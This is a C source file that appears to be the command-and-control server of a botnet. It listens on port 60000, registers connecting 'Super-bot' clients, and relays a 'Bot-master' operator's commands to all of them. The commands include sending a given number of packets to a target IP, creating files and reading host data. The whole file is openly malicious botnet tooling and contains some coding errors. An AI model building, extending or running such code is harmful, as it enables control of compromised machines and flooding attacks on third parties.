#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/poll.h>
#include <pthread.h>

#define MAX_SOCKET 100

void error(const char *msg)
{
    perror(msg);
    exit(0);
}
int main(int argc, char **argv)
{
   int server_sockfd, client_sockfd, sockfd;
   int state, nread;
   socklen_t client_len;
   int i,max;
   int count = 0;
   char id[MAX_SOCKET][2];

   char instruction[255];
   char ip_addr[255];
   char read_bot[255];
   char read_option[255];
   char bot_number[2];
   char create_route[255];
   int num_packet;

   struct sockaddr_in clientaddr, serveraddr;
   struct pollfd client[MAX_SOCKET];

   char buf[255];
   char message[255];
   char message_temp[255];
   char *temp;

   state = 0;

   client_len = sizeof(clientaddr);

   if((server_sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
       error("socket error");

   bzero(&serveraddr, sizeof(serveraddr));
   serveraddr.sin_family = AF_INET;
   serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
   serveraddr.sin_port = htons(60000);

   state = bind(server_sockfd, (struct sockaddr *)&serveraddr, sizeof(serveraddr));

   if(state == -1)
       error("bind error");

   state = listen(server_sockfd, 10);
   if(state == -1)
       error("listen error");

   //poll start

   client[0].fd = server_sockfd;
   client[0].events = POLLIN;
   for(i=1;i<MAX_SOCKET;i++)
   {
       client[i].fd = -1;
   }
   max = 0;

   printf("/***************MENU***************/\n");
   printf("1) Show bot hierarchy\n");
   printf("2) Read (Host or Date)\n");
   printf("3) Create file\n");
   printf("4) Send packet\n");
   printf("5) Search bots\n");
   printf("/**********************************/\n");

   while(1)
   {
       count++;
       nread = poll(client, max+i, 1000);

       memset(message,'\0',255);
       memset(message_temp,'\0',255);
       

       if(client[0].revents & POLLIN)
       {
           client_sockfd = accept(server_sockfd,(struct sockaddr *)&clientaddr,&client_len);
           for(i=1;i<MAX_SOCKET;i++)
           {
               if(client[i].fd < 0)
               {
                   client[i].fd = client_sockfd;
                   client[i].events = POLLIN;
                   read(client[i].fd,id[i],2);
                   printf("Super-bot %c%c is connected.\n",id[i][0],id[i][1]);
                   break;
               }
           }

           if(i > max)
               max = i;

           if(--nread <= 0)
               continue;
       }

       if(count%3 == 0)
       {
           printf("Bot-master #");
           fgets(message,255,stdin);
           strncpy(message_temp,message,sizeof(message_temp));
           temp = strtok(message_temp," ");
           strncpy(instruction,temp,sizeof(temp));
           if(strstr(instruction,"show"))
           {
           }
           else if(strstr(instruction,"read"))
           {
               temp = strtok(NULL," ");
               strncpy(bot_number,temp,2*sizeof(char));
               temp = strtok(NULL," ");
               strncpy(read_option,temp,sizeof(read_option));
           }
           else if(strstr(instruction,"create"))
           {
               temp = strtok(NULL," ");
               if(temp == NULL)
                   continue;
               strncpy(bot_number,temp,2*sizeof(char));
           }
           else if(strstr(instruction,"send"))
           {
               temp = strtok(NULL," ");
               printf("%s\n",temp);
               if(temp == NULL)
                   continue;
               num_packet = atoi(temp);
               temp = strtok(NULL," ");
               strncpy(ip_addr,temp,sizeof(ip_addr));
           }
           else if(strstr(instruction,"search"))
           {
               temp = strtok(NULL," ");
               strncpy(bot_number,temp,2*sizeof(char));
           }
           else
           {
               //printf("Insert correct instruction\n");
           }
       }
       for(i=1;i<=max;i++)
       {
           if((sockfd = client[i].fd) < 0)
               continue;
           if(client[i].revents & (POLLIN | POLLERR))
           {
               memset(buf,'\0',255);
               if(read(sockfd,buf,255) <= 0)
               {
                   printf("Super-bot %c%c is disconnected.\n",id[i][0],id[i][1]);
                   close(client[i].fd);
                   client[i].fd = -1;
               }
               else
               {
                   printf("%s\n",buf);
               }

           }
           if(count%3 == 0)
           {
               write(client[i].fd,message,sizeof(message));
           }
           memset(message,'\0',255);
       }
   }
   return 0;
}
